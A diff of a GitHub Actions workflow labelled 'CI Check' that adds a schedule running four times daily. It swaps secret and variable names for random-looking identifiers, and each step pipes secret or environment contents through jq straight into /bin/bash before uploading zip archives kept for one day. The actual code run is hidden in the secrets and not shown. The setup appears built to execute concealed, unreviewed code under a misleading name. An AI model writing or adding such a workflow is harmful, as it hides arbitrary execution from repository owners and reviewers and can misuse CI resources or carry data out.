@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '29 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,16 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          vi253: ${{ secrets.vi253 }}
+          bnfk0275: ${{ secrets.bnfk0275 }}
         run: |
-          printf '%s' "$vi253" | jq -r .eavqm07 | /bin/bash
-          printf '%s' "$uif1" | jq -r .tpimp5971 | /bin/bash
-          echo $kzeb9077 | jq -r .jdpbp287 | /bin/bash
-          echo $cdwrb028 | jq -r .kxyq1 | /bin/bash
+          printf '%s' "$bnfk0275" | jq -r .v29443 | /bin/bash
+          echo $q99 | jq -r .mac9530 | /bin/bash
+          echo $qjrgk852 | jq -r .x1 | /bin/bash
+          printf '%s' "$gum5677" | jq -r .byaky635 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: m2epCIMW
+          name: wxr6Al4J
           path: "*.zip"
           retention-days: 1
